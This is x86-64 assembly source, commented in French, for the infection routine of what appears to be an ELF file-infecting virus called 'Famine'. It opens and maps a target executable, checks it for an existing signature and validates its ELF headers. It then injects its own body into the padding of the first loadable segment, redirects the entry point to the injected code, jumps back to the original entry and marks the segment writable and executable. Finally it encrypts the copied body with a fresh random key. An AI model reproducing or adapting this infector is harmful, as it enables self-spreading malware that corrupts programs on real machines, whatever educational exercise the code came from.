; void  infect_file(char *filename, t_famine, *famine);
infect_file:
    mov r12, rdi
    lea rdi, [r12 + fileName]
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall              ; open(filemane, O_RDWR)
    cmp rax, 0           ; if (fd < 0) return ;
    jl bad_fd
    mov [r12 + fd], rax
get_file_data:
    mov rdi, [r12 + fd]
    xor rsi, rsi
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall             ; lseek(fd, 0, SEEK_END)
    mov [r12 + fileSize], rax
    cmp rax, 0          ; if (size < 0) return ;
    jl close_file
    cmp rax, SIGNATURE_SIZE          ; if (size > SIGNATURE_SIZE) continue ;
    jge file_size_ok
    lea rdi, [r12 + fileName]
    call append_signature
    jmp close_file
    file_size_ok:                                                                                               ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
    
    xor rdi, rdi
    mov rsi, [r12 + fileSize]
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
    mov r8, [r12 + fd]
    xor r9, r9
    mov rax, SYS_MMAP
    syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
    cmp rax, 0          ; if (!fileData) return ;
    jz  close_file
    mov [r12 + fileData], rax   ; faire des check pour le format

check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
    xor rdx, rdx
    lea rax, [rel signature]
    mov rbx, [r12 + fileSize]
    sub rbx, SIGNATURE_SIZE - 1
    jmp check_signature_cmp
    check_signature_loop:
        mov rdi, rax
        mov rsi, [r12 + fileData]
        add rsi, rdx
        mov rcx, SIGNATURE_SIZE  
        repz cmpsb
        jz close_mmap           ; on quite proprement si il y a deja une signature
        inc rdx  
    check_signature_cmp:
    cmp rdx, rbx
    jl check_signature_loop
    
check_file_integrity:
    mov rdi, [r12 + fileData]
    cmp dword [rdi], 0x464c457f ; magic number 0x7f454c46 464c457f
	jnz simple
	mov sil, [rdi + s_support]
	cmp sil, 1			; cmp 32 bit
	je simple
	bit_64:
    ; check if the file is bigger than an ELF_HEADER_FILE
    xor rax, rax
    mov rsi, [r12 + fileSize]
	cmp rsi, 64
	jl simple

	; check if the file is bigger than pheader info indicated
	mov ax, [rdi + e_phentsize]
	mov cx, [rdi + e_phnum]
	mul cx
	cmp rsi, rax
	jl simple

	; check if the file is bigger than the sheader info indicated
	mov ax, [rdi + e_shentsize]
	mov cx, [rdi + e_shnum]
	mul cx
	add rax, [rdi + e_shoff]
	cmp rax, rsi
	jne simple
    jmp get_file_entry

simple: 
    lea rdi, [r12 + fileName]
    call append_signature
    jmp close_mmap


get_file_entry:                     ; recupere l'entry point de l'executable
    mov rax, [r12 + fileData]
    mov rdi, [rax + e_entry]
    mov [r12 + oldEntry], rdi
    

get_first_pload:
    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
    xor r14, r14                  ; mise a 0
    xor rdi, rdi
    mov di, [r13 + e_phnum]
    mov rsi, [r13 + e_phoff]
    xor rdx, rdx
    mov dx, [r13 + e_phentsize]
    xor rax, rax
phead_loop:
    mov eax, [r13 + rsi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
    cmp eax, PT_LOAD
    jz first_pload_found
    inc r14
    add rsi, rdx
    cmp r14, rdi
    jl phead_loop
    jmp close_mmap                    ;on quite si il n'y a pas de pload trouvé
first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
    add r13, rsi
    mov [r12 + pload], r13
check_pload_size:
    xor rdx, rdx
    mov rax, [r13 + p_filesz]
    mov rdi, [r13 + p_align]
    div rdi
    sub rdi, rdx
    cmp rdi, PROG_SIZE                      ; regarde si on a assez de place dans le bourrage et fait un simple append de la signature si on a pas assez
    jl simple
    mov rax, [r13 + p_filesz]
    add rax, PROG_SIZE
    mov rdi, [r12 + fileSize]
    cmp rdi, rax
    jl simple                               ; si le pload + le programe est plus grand que le fichier


write_virus_entry:
    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
    add rdi, [r13 + p_memsz]
    mov [r12 + entry], rdi
    mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
    mov [rsi + e_entry], rdi


copy_program:
    mov rdi, [r12 + fileData]               ; address a la fin du premier pload
    add rdi, [r13 + p_filesz]
    mov rbx, rdi
    lea rsi, [rel main]                     ; address du debut du programe
    mov rcx, PROG_SIZE                      ; taille du programe
    rep movsb
    
    ; calcule le jump qu'il faut faire pour attendre l'entry normale 
    mov rdx, [r12 + entry]
    add rdx, JMP_OFFSET + 5
    mov rcx, [r12 + oldEntry]
    sub ecx, edx
    
    ; ecrit le jump a l'adress de jump
    mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
    mov [rbx + JMP_OFFSET + 1], ecx

    ; augmente la taille du premier pload
    add qword [r13 + p_memsz], PROG_SIZE
    add qword [r13 + p_filesz], PROG_SIZE
    
    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
    or dword [r13 + p_flags], PF_W           ; ajoute les droit d'execution

change_key:
    lea rdi, [rbx + KEY_OFFSET]
    mov rsi, KEY_SIZE
    mov rdx, GRND_RANDOM
    mov rax, SYS_GETRANDOM
    syscall

; rdi = data
; rsi = key
; rax = n  int data[n]
; rcx = m  int key[n]
encrypt:
    lea rdi, [rbx + ENCRYPT_OFFSET]
    lea rsi, [rbx + KEY_OFFSET]
	xor rax, rax
	xor rcx, rcx
    xor rbx, rbx
    jmp encrypt_byte
	encrypt_loop:
	inc rcx
	cmp rcx, KEY_SIZE
	jnz encrypt_nochange
	xor rcx, rcx
	encrypt_nochange:
    mov bl,  [rdi + rax - 1]
    encrypt_byte:
    add bl,  [rsi + rcx]
	add [rdi + rax], bl
    inc rax
    encrypt_cmp:
	cmp rax, ENCRYPT_SIZE
	jl encrypt_loop

close_mmap:
    mov rdi, [r12 + fileData]
    mov rsi, [r12 + fileSize]
    mov rax, SYS_MUNMAP 
    syscall             ; munmap(fileData, fileSize)

close_file:
    mov rdi, [r12 + fd]
    mov rax, SYS_CLOSE  
    syscall             ; close(fd)
bad_fd:
    ret
